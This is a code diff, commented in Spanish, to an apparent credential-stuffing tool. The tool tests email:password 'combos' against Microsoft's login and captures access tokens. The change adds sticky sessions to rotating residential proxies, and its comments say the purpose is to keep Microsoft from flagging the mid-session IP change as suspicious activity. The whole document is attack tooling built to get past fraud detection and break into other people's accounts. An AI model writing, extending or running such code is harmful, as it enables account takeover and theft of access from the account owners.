@@ -249,6 +249,51 @@ def parse_proxy(proxy_str: str) -> Optional[str]:
 
 
 # ═════════════════════════════════════════════════════════════
+#  STICKY SESSION POR COMBO (para proxies rotativas)
+# ═════════════════════════════════════════════════════════════
+#  Las proxies rotativas (flameproxies, brightdata, oxylabs, ...)
+#  cambian de IP en cada request. Eso rompe el login de Microsoft
+#  porque:
+#    1. GET authorize.srf → cookies de sesión con IP-A
+#    2. POST login → misma cookie pero desde IP-B distinta
+#    3. Microsoft ve "cambio de IP mid-session" → sirve página de
+#       "actividad sospechosa" → el clasificador no la reconoce → UNKNOWN
+#
+#  Solución: agregar un session_id al username de la proxy para que
+#  el provider mantenga la misma IP durante toda la sesión del combo.
+#  Formato: 'user-session-<id>:pass@host:port'
+#  Soportado por: flameproxies, brightdata, oxylabs, smartproxy, etc.
+# ═════════════════════════════════════════════════════════════
+
+_STICKY_SESSION_RE = re.compile(r'^(\w+://)([^:@/]+):([^@/]+)@(.+)$')
+
+
+def add_sticky_session(proxy_url: str, session_id: str) -> str:
+    """Agregar un session_id al username de la proxy para mantener IP estable.
+
+    Formato resultante: scheme://user-session-<id>:pass@host:port
+
+    Si la proxy no tiene auth (user:pass) o ya tiene un session_id,
+    se devuelve sin modificar (no se puede agregar sticky session).
+    """
+    if not proxy_url or not session_id:
+        return proxy_url
+
+    m = _STICKY_SESSION_RE.match(proxy_url)
+    if not m:
+        return proxy_url  # sin auth o formato no soportado
+
+    scheme, user, pw, host = m.group(1), m.group(2), m.group(3), m.group(4)
+
+    # Si el user ya tiene un session_id, no agregar otro
+    if '-session-' in user or '-sessid-' in user or '_session-' in user:
+        return proxy_url
+
+    new_user = f"{user}-session-{session_id}"
+    return f"{scheme}{quote(new_user, safe='')}:{quote(pw, safe='')}@{host}"
+
+
+# ═════════════════════════════════════════════════════════════
 #  DETECCIÓN DE PROXY ROTATIVA vs ESTÁTICA
 # ═════════════════════════════════════════════════════════════
 #  Una proxy ROTATIVA (ej: flameproxies) devuelve IPs distintas en
@@ -462,6 +507,12 @@ def _classify_result(r, session: requests.Session) -> tuple:
 def _worker(combo: str, proxy: Optional[str] = None) -> Optional[dict]:
     """Procesar un solo combo email:pass.
 
+    Estrategia sticky session: si la proxy es rotativa, le agregamos
+    un session_id único por combo para que el provider mantenga la
+    misma IP durante toda la sesión del combo (GET + POST).
+    Sin esto, las proxies rotativas rompen el login de Microsoft
+    porque la cookie de sesión se setea con IP-A y se usa con IP-B.
+
     Retorna dict con:
         combo, status, access_token (opcional), proxy
     o None si el combo no tiene formato válido.
@@ -476,7 +527,20 @@ def _worker(combo: str, proxy: Optional[str] = None) -> Optional[dict]:
     if not user or not password or "@" not in user:
         return None
 
-    session = _build_session(proxy)
+    # ── Sticky session por combo ──
+    # Generar un session_id único de 8 chars (UUID4 truncado) por combo.
+    # Si la proxy es rotativa, esto fuerza al provider a mantener la misma
+    # IP durante GET + POST del mismo combo (evita el "cambio de IP mid-session"
+    # que Microsoft detecta como actividad sospechosa).
+    # Si la proxy es estática o no soporta sticky sessions, no pasa nada —
+    # el formato '-session-<id>' se ignora y la proxy funciona igual.
+    actual_proxy = proxy
+    if proxy:
+        import uuid as _uuid
+        session_id = _uuid.uuid4().hex[:8]
+        actual_proxy = add_sticky_session(proxy, session_id)
+
+    session = _build_session(actual_proxy)
 
     try:
         ppft, url_post = _get_ppft(session, user)
